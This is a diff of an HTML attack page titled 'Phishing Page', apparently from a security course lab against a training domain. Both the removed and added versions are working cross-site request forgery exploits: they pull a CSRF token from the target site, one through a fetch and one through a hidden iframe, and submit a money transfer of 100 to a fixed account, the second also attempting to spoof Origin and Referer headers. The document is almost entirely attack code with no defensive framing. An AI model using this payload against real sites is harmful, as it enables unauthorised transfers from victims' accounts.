@@ -1,21 +1,60 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Page</title>
+    <style>
+        iframe {
+            display: none; /* Hide the iframe */
+        }
+    </style>
+</head>
 <body>
-<form id="transferForm" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-    <input type="hidden" name="csrf_token" id="csrfToken">
-    <input type="hidden" name="username" value="z5481975">
-    <input type="hidden" name="amount" value="100">
-</form>
-<script>
-fetch('https://phish-me.quoccacorp.com/')
-    .then(response => response.text())
-    .then(data => {
-        const parser = new DOMParser();
-        const doc = parser.parseFromString(data, 'text/html');
-        const token = doc.querySelector('input[name="csrf_token"]').value;
-        document.getElementById('csrfToken').value = token;
-        document.getElementById('transferForm').submit();
-    })
-    .catch(error => console.error('Error fetching CSRF token:', error));
-</script>
+    <!-- Load the target website in a hidden iframe -->
+    <iframe id="targetFrame" src="https://phish-me.quoccacorp.com/"></iframe>
+
+    <script>
+        // Wait for the iframe to load
+        const iframe = document.getElementById('targetFrame');
+        iframe.onload = function () {
+            try {
+                // Access the form inside the iframe to extract the CSRF token
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const form = iframeDoc.querySelector('form'); // Assuming the CSRF token is in a form
+                const csrfTokenInput = form.querySelector('input[name="csrf_token"]');
+                const csrfToken = csrfTokenInput ? csrfTokenInput.value : '';
+
+                if (csrfToken) {
+                    // Prepare the data for the POST request
+                    const data = new URLSearchParams();
+                    data.append('csrf_token', csrfToken);
+                    data.append('username', 'z5481975');
+                    data.append('amount', '100');
+
+                    // Send the POST request to transfer money
+                    fetch('https://phish-me.quoccacorp.com/api/transfer', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded',
+                            'Origin': 'https://phish-me.quoccacorp.com',
+                            'Referer': 'https://phish-me.quoccacorp.com/'
+                        },
+                        body: data
+                    })
+                    .then(response => {
+                        console.log('Transfer attempted:', response.status);
+                    })
+                    .catch(error => {
+                        console.error('Error during transfer:', error);
+                    });
+                } else {
+                    console.error('CSRF token not found');
+                }
+            } catch (e) {
+                console.error('Error accessing iframe content:', e);
+            }
+        };
+    </script>
 </body>
 </html>
